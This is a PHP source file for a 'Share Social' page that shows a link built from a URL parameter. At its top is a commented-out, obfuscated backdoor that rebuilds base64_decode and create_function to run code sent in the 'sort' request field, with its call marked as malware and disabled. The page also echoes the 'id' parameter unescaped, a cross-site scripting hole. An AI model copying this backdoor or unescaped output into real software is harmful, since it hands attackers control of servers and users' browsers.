<?php 


// if(isset($_REQUEST['sort'])){	

// 	$string = $_REQUEST['sort'];

// 	$array_name = '';

// 	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";

// 	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);

// 	foreach($ar as $t){

// 	   $array_name .= $alphabet[$t];

// 	}

// 	$a = strrev("noi"."tcnuf"."_eta"."erc");

// 	$f = $a("", $array_name($string));

// 	// MALWARE $f();

// 	exit();

// }



$last_id = $_GET["id"];	
// $final_url = "http://".$_SERVER["SERVER_NAME"]."/supply.php?id=".$last_id;
$final_url = "supply.php?id=".$last_id;

?>

<html>
<head>
	<title>Share Social</title>
	<meta name="description" content="ShareSocial provides a service of sharing any webpage, of any website, with photo of your choice and your own description on social networks such as FB, LinkedIn, Google+ and whatsapp.">
	<meta name="keywords" content="SEO, share, facebook, custom article, dynamic link binding">
	<meta name="author" content="Rao Information Technology">
	<meta name="image" content="http://www.sharesocial.in/finalLogo-min.png">

	<meta name="og:title" content="Share Social">
	<meta name="og:image" content="http://www.sharesocial.in/finalLogo-min.png">
	<meta name="og:description" content="ShareSocial provides a service of sharing any webpage, of any website, with photo of your choice and your own description on social networks such as FB, LinkedIn, Google+ and whatsapp.">
	<meta name="og:keywords" content="SEO, share, facebook, custom article, dynamic link binding">
	<meta name="og:author" content="Rao Information Technology">

	<link rel="apple-touch-icon" sizes="57x57" href="favicons/apple-icon-57x57.png">
	<link rel="apple-touch-icon" sizes="60x60" href="favicons/apple-icon-60x60.png">
	<link rel="apple-touch-icon" sizes="72x72" href="favicons/apple-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="76x76" href="favicons/apple-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="114x114" href="favicons/apple-icon-114x114.png">
	<link rel="apple-touch-icon" sizes="120x120" href="favicons/apple-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="144x144" href="favicons/apple-icon-144x144.png">
	<link rel="apple-touch-icon" sizes="152x152" href="favicons/apple-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="favicons/apple-icon-180x180.png">
	<link rel="icon" type="image/png" sizes="192x192"  href="favicons/android-icon-192x192.png">
	<link rel="icon" type="image/png" sizes="32x32" href="favicons/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="96x96" href="favicons/favicon-96x96.png">
	<link rel="icon" type="image/png" sizes="16x16" href="favicons/favicon-16x16.png">
	<link rel="manifest" href="favicons/manifest.json">
	<meta name="msapplication-TileColor" content="#ffffff">
	<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
	<meta name="theme-color" content="#ffffff">
	<link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.css" />
	<script src="bower_components/jquery/dist/jquery.js"></script>
	<script src="bower_components/bootstrap/dist/js/bootstrap.js"></script>
	<style>
	.no-margin{
		margin:0;
	}
	.no-padding{
		padding: 0;
	}
	.flex{
		display: flex;
	}
	.full-height{
		height: 100%;
	}
	</style>
</head>
<body>
	<div class="container-fluid">
		<div class="row well-lg bg-primary" style="">
			<div class="col-md-2">
				<img src="finalLogo-min.png" class="img-responsive" style="height:150px; display:inline-block; border-style:solid; border-color:white; border-width:0px; background-color:rgba(255,255,255,0.9); border-radius:10px;margin:auto; box-shadow:1mm 1mm 10px black;"> 
			</div>
			<h1 class="page-header col-md-10">
				<span style="font-family:monospace; font-size:64px;">Share Social</span>
			</h1>
		</div>
		<div class="row">
			<div class="col-md-10 col-md-offset-1">

				<h1 class="jumbotron">Share this url on facebook. : <br>
					<kbd><?php echo $final_url; ?></kbd>
				</h1>
			</div>
		</div>
	</div>
</body>
</html>
